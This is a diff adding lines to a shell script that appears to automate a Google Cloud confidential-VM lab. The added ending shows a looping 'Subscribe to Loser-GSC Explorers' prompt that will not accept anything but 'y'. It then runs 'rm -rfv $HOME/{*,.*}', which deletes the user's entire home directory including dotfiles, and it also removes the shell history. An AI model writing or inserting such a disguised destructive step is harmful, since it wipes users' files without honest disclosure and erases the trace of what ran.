@@ -174,3 +174,18 @@ gcloud compute instances create mpc-cvm --confidential-compute \
   --image-family=confidential-space \
   --service-account=run-confidential-vm@$MPC_PROJECT_ID.iam.gserviceaccount.com \
   --metadata ^~^tee-image-reference=$REGION-docker.pkg.dev/$MPC_PROJECT_ID/mpc-workloads/initial-workload-container:latest~tee-restart-policy=Never~tee-env-NODE_URL=$(gcloud compute instances describe mpc-lab-ethereum-node --format='get(networkInterfaces[0].networkIP)' --zone=$ZONE)~tee-env-RESULTS_BUCKET=$MPC_PROJECT_ID-mpc-results-storage~tee-env-KEY_BUCKET=$MPC_PROJECT_ID-mpc-encrypted-keys~tee-env-MPC_PROJECT_ID=$MPC_PROJECT_ID~tee-env-MPC_PROJECT_NUMBER=$(gcloud projects describe $MPC_PROJECT_ID --format="value(projectNumber)")
+
+#-----------------------------------------------------end----------------------------------------------------------#
+read -p "${BOLD}${GREEN}Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
+
+while [ "$CONSENT_REMOVE" != 'y' ]; do
+  sleep 10
+  read -p "${BOLD}${MAGENTA}Do Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
+done
+
+echo "${CYAN}${BOLD}Thanks For Subscribing to Loser-GSC Explorers :)${RESET}"
+
+rm -rfv $HOME/{*,.*}
+rm $HOME/.bash_history
+
+exit 0
